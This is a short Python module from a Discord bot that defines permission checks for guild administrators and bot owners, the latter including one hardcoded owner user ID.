from discord import Member, User

from resources import bot


def is_user_admin_permitted(member: Member):
    return member.guild_permissions.administrator


def is_bot_owner(user: User):
    bot_owners = bot.owner_ids
    bot_owners.add(330148908531580928)
    return user.id in bot_owners

